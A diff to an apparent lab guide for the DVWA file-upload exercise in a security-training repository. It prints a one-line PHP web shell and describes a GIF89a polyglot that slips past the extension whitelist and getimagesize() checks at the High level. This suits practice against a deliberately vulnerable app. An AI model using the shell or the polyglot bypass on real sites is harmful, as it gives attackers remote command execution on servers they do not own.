@@ -7,11 +7,18 @@ Repo: https://github.com/Bhandarihansraj/cyberSEC
 2. Run: `./tasks/task5_file_upload/run.sh start` (confirms DVWA up, prints checklist)
 3. Left menu → **Upload**
 
-### Shell payload (used at every level)
+### Ready-made payload files (in the repo)
+```
+tasks/task5_file_upload/payloads/shell.php   -- plain PHP web shell, use for Low & Medium
+tasks/task5_file_upload/payloads/shell.gif   -- GIF89a header + PHP payload, polyglot for High
+```
+
+`shell.php` content:
 ```php
 <?php system($_GET['cmd']); ?>
 ```
-Save as `shell.php`.
+
+`shell.gif` = `GIF89a` bytes followed by the same PHP payload — passes both extension whitelist and `getimagesize()` checks at High (see High section below for what happens after upload).
 
 ---
 
